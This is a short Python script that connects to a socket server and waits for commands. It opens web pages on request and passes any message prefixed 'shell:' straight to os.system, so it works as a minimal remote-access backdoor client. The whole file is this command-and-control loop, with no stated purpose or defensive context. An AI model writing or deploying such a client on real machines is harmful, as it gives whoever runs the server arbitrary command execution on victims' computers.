import socket               # Import socket module
import webbrowser
import sys
import os
s = socket.socket()         # Create a socket object
host = "127.0.0.1" # Server that client will connect to
port = 134                # Server's port 

s.connect((host, port))

while True:
    
    
    received = s.recv(1024).decode(encoding="utf-8")
    if(received == "close"):
        
    
        sys.exit()
    if(received[:10] == "visitsite:"):

        webbrowser.open(received.replace("visitsite:",""))
    if(received[:6] == "shell:"):
        os.system(received.replace("shell:",""))
        
